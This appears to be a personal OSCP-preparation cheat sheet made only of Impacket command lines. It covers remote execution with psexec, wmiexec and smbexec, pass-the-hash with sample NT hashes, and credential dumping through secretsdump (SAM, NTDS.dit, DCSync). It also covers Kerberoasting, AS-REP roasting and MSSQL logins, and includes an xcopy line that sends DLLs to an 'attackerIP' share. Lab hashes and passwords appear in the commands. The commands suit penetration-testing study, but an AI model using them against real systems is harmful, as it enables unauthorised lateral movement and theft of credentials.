### 21-Oct-23 Sat

```
impacket-psexec domain/username:'password'@IP
```

```
impacket-psexec username@ip -hashes LM:NT
```

```
impacket-wmiexec domain/username:'password'@IP
```

```
impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
```

```
impacket-smbexec domain/username:'password'@IP
```

```
impacket-secretsdump -sam sam -security security -system system LOCAL
```

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

```
impacket-secretsdump sync.csl/manager:'!!MILKSHAKE!!'@172.31.3.6
```

```
impacket-GetUserSPNs -request -dc-ip $DomainIP $DomainName/$DomainUser
```

```
impacket-GetNPUsers -request -dc-ip $DomainIP $DomainName/$DomainUser
```

```
impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
```

```
proxychains -q impacket-psexec -hashes
00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
```

```
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
```

```
impacket-GetNPUsers sync.csl/manager -format john
```

```
sudo impacket-smbserver -smb2support share $(pwd)
```

![image](https://github.com/r1skkam/OffSec-PEN-200-OSCP-Preparation/assets/58542375/c49f33ee-54e0-4aaa-800f-f66de51e0b5a)

```
xcopy *.dll \\attackerIP\share\
```

```
impacket-mssqlclient [[domain/]username[:password]@]<targetName or address>
```

```
impacket-mssqlclient sequel.htb/sql_svc:'REGGIE1234ronnie'@10.129.213.2 -windows-auth
```

